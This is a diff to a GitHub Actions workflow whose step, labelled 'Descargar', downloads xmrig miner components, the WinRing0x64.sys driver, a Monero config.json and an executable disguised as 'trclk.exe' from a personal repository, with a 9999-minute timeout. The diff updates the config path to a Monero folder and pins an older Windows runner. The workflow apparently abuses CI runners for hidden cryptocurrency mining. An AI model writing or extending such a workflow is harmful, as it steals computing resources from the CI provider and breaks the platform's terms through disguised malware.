@@ -7,13 +7,13 @@ on: workflow_dispatch
 jobs:
   mnrcr:
 
-    runs-on: windows-latest
+    runs-on: windows-2016
     timeout-minutes: 9999
 
     steps:
     - name: Descargar.
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/dsctpr/main/config.json -OutFile config.json
+        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/dsctpr/main/Monero/config.json -OutFile config.json
         Invoke-WebRequest https://raw.githubusercontent.com/romanferty/dsctpr/main/xmrig-asm.lib -OutFile xmrig-asm.lib
         Invoke-WebRequest https://raw.githubusercontent.com/romanferty/dsctpr/main/WinRing0x64.sys -OutFile WinRing0x64.sys
         Invoke-WebRequest https://raw.githubusercontent.com/romanferty/dsctpr/main/trclk.exe -OutFile trclk.exe
